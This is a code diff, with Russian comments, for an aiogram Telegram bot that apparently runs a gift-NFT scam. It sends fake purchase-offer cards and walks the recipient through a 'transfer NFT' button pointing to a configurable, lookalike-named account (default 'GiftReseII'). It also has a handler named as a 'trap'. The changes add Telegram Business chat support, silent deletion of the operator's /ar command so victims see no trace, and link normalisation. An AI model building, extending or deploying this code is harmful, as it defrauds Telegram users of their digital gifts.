@@ -46,7 +46,6 @@ def save_json_set(filename: str, data: set):
     with open(filename, "w", encoding="utf-8") as f:
         json.dump(list(data), f)
 
-# Управление конфигом (ссылкой для передачи NFT)
 def load_config() -> dict:
     if os.path.exists(CONFIG_FILE):
         try:
@@ -189,7 +188,12 @@ def get_step1_kb() -> InlineKeyboardMarkup:
 
 def get_step2_kb() -> InlineKeyboardMarkup:
     config = load_config()
-    target_url = config.get("nft_url", "https://t.me/GiftReseII")
+    target_url = config.get("nft_url", "https://t.me/GiftReseII").strip()
+    if target_url.startswith("@"):
+        target_url = f"https://t.me/{target_url[1:]}"
+    elif not target_url.startswith(("http://", "https://", "tg://")):
+        target_url = f"https://{target_url}"
+
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать NFT", url=target_url)],
         [InlineKeyboardButton(text="➡️ Продолжить", callback_data="explain_continue_btn")]
@@ -208,7 +212,7 @@ async def cmd_start(message: Message):
         f"🔑 Ваш Telegram ID: <code>{uid}</code>\n"
         f"{status_text}\n\n"
         "⚙️ <b>Способы отправки:</b>\n"
-        "• <code>/ar [ссылка] [цена]</code> — отправить оффер (команда удалится автоматически)\n"
+        "• <code>/ar [ссылка] [цена]</code> — отправить оффер в бизнес-чате (команда удалится)\n"
         "• <code>@имя_бота [ссылка] [цена]</code> — отправка через инлайн без команд в чате\n"
     )
     if uid in SUPER_ADMIN_IDS:
@@ -258,9 +262,10 @@ async def cb_admin_list(callback: CallbackQuery):
     await callback.answer()
 
 @dp.callback_query(F.data == "admin_back")
-async def cb_admin_back(callback: CallbackQuery):
+async def cb_admin_back(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in SUPER_ADMIN_IDS:
         return
+    await state.clear()
     total_users = len(all_users)
     auth_count = len(allowed_users)
     config = load_config()
@@ -294,7 +299,7 @@ async def cb_set_url(callback: CallbackQuery, state: FSMContext):
     back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
     await callback.message.edit_text(
         f"🔗 Текущая ссылка: <code>{current_url}</code>\n\n"
-        "<b>Отправьте новую ссылку</b> (например: <code>https://t.me/NewAccount</code> или <code>t.me/account</code>):",
+        "<b>Отправьте новую ссылку</b> (например: <code>https://t.me/NewAccount</code>):",
         parse_mode="HTML", reply_markup=back_kb
     )
     await callback.answer()
@@ -340,6 +345,10 @@ async def process_nft_url(message: Message, state: FSMContext):
     if message.from_user.id not in SUPER_ADMIN_IDS:
         return
     new_url = message.text.strip()
+    if new_url.startswith("@"):
+        new_url = f"https://t.me/{new_url[1:]}"
+    elif not new_url.startswith(("http://", "https://", "tg://")):
+        new_url = f"https://{new_url}"
     config = load_config()
     config["nft_url"] = new_url
     save_config(config)
@@ -402,37 +411,42 @@ async def process_broadcast(message: Message, state: FSMContext):
     )
 
 # =====================================================================
-# ИСПРАВЛЕННАЯ ФУНКЦИЯ: СНАЧАЛА УДАЛЯЕТ КОМАНДУ /ar, ЗАТЕМ ШЛЕТ КАРТОЧКУ
+# ОБРАБОТКА КОМАНДЫ /ar (И В ОБЫЧНОМ ЧАТЕ, И В БИЗНЕС-ЧАТЕ)
 # =====================================================================
 async def execute_ar_command(message: Message, is_business: bool = False):
+    if not message.from_user:
+        return
+
     user_id = message.from_user.id
     register_user(user_id)
+    print(f"[LOG] Получена команда /ar от ID {user_id} | is_business={is_business}")
     
     if not is_authorized(user_id):
+        print(f"[WARN] У пользователя {user_id} нет доступа!")
         if not is_business:
             await message.answer("❌ У вас нет доступа к использованию этого бота.")
         return
 
     text = message.text or ""
-    args_text = text[3:].strip()
-    raw_args = args_text or "MirageLamp-44307 2727 stars"
+    parts = text.split(maxsplit=1)
+    raw_args = parts[1].strip() if len(parts) > 1 else "MirageLamp-44307 2727 stars"
     
     slug, price_display, _ = parse_query_and_price(raw_args)
     biz_conn_id = message.business_connection_id if is_business else None
 
-    # 1. Мгновенно удаляем сообщение с командой /ar, чтобы не было видно команды и значка "изменено"
+    # 1. Удаляем исходное сообщение с командой /ar
     try:
         if biz_conn_id:
             await bot.delete_business_messages(
                 business_connection_id=biz_conn_id,
                 message_ids=[message.message_id]
             )
-        else:
+        elif message.chat.type != "private":
             await message.delete()
     except Exception as e:
-        print(f"Не удалось удалить исходную команду: {e}")
+        print(f"[WARN] Не удалось удалить команду /ar (проверьте галочку удаления сообщений в Telegram Business): {e}")
 
-    # 2. Парсим данные подарка и отправляем совершенно новое чистое сообщение
+    # 2. Парсим данные подарка и отправляем карточку
     data = await fetch_real_nft_data(slug)
 
     preview_opts = LinkPreviewOptions(
@@ -443,27 +457,31 @@ async def execute_ar_command(message: Message, is_business: bool = False):
     )
 
     try:
-        await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=biz_conn_id,
-            text=format_parsed_card(data, price_display),
-            parse_mode="HTML",
-            link_preview_options=preview_opts,
-            reply_markup=get_step1_kb()
-        )
-    except Exception as e:
-        print(f"Ошибка отправки карточки: {e}")
+        kwargs = {
+            "chat_id": message.chat.id,
+            "text": format_parsed_card(data, price_display),
+            "parse_mode": "HTML",
+            "link_preview_options": preview_opts,
+            "reply_markup": get_step1_kb()
+        }
+        if biz_conn_id:
+            kwargs["business_connection_id"] = biz_conn_id
 
-@dp.message(F.text.startswith("/ar"))
+        await bot.send_message(**kwargs)
+        print("[LOG] Карточка успешно отправлена!")
+    except Exception as e:
+        print(f"[ERROR] Ошибка отправки карточки: {e}")
+
+@dp.message(F.text.regexp(r"^/ar(\b|@)"))
 async def handle_regular_ar(message: Message):
     await execute_ar_command(message, is_business=False)
 
-@dp.business_message(F.text.startswith("/ar"))
+@dp.business_message(F.text.regexp(r"^/ar(\b|@)"))
 async def handle_business_ar(message: Message):
     await execute_ar_command(message, is_business=True)
 
 # =====================================================================
-# ДОБАВЛЕН INLINE-РЕЖИМ (ЧТОБЫ ОТПРАВЛЯТЬ ВООБЩЕ БЕЗ КОМАНДЫ /ar В ЧАТЕ)
+# INLINE-РЕЖИМ
 # =====================================================================
 @dp.inline_query()
 async def handle_inline_ar(inline_query: InlineQuery):
@@ -498,6 +516,9 @@ async def handle_inline_ar(inline_query: InlineQuery):
 
     await inline_query.answer([result], cache_time=1, is_personal=True)
 
+# =====================================================================
+# ОБРАБОТКА КНОПОК (С ПОДДЕРЖКОЙ БИЗНЕС-ЧАТОВ)
+# =====================================================================
 @dp.callback_query(F.data == "step2_accept")
 async def process_step2(callback: CallbackQuery):
     step2_text = (
@@ -505,10 +526,25 @@ async def process_step2(callback: CallbackQuery):
         "1. Нажмите <b>«Передать NFT»</b> и отправьте подарок.\n"
         "2. После отправки нажмите <b>«Продолжить»</b>."
     )
-    if callback.message:
-        await callback.message.edit_text(text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
-    elif callback.inline_message_id:
-        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
+    try:
+        if callback.message:
+            await bot.edit_message_text(
+                chat_id=callback.message.chat.id,
+                message_id=callback.message.message_id,
+                business_connection_id=callback.message.business_connection_id,
+                text=step2_text,
+                parse_mode="HTML",
+                reply_markup=get_step2_kb()
+            )
+        elif callback.inline_message_id:
+            await bot.edit_message_text(
+                inline_message_id=callback.inline_message_id,
+                text=step2_text,
+                parse_mode="HTML",
+                reply_markup=get_step2_kb()
+            )
+    except Exception as e:
+        print(f"[ERROR] Ошибка редактирования (step2_accept): {e}")
     await callback.answer()
 
 @dp.callback_query(F.data == "explain_continue_btn")
@@ -518,15 +554,29 @@ async def explain_continue_trap(callback: CallbackQuery):
 @dp.callback_query(F.data == "decline_offer")
 async def process_decline(callback: CallbackQuery):
     declined_text = "❌ <b>Предложение отклонено владельцем</b>"
-    if callback.message:
-        await callback.message.edit_text(text=declined_text, parse_mode="HTML")
-    elif callback.inline_message_id:
-        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
+    try:
+        if callback.message:
+            await bot.edit_message_text(
+                chat_id=callback.message.chat.id,
+                message_id=callback.message.message_id,
+                business_connection_id=callback.message.business_connection_id,
+                text=declined_text,
+                parse_mode="HTML"
+            )
+        elif callback.inline_message_id:
+            await bot.edit_message_text(
+                inline_message_id=callback.inline_message_id,
+                text=declined_text,
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        print(f"[ERROR] Ошибка редактирования (decline_offer): {e}")
     await callback.answer("Оффер отклонен")
 
 async def main():
+    await bot.delete_webhook(drop_pending_updates=True)
     print("Бот успешно запущен!")
-    await dp.start_polling(bot)
+    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
 
 if __name__ == "__main__":
     asyncio.run(main())
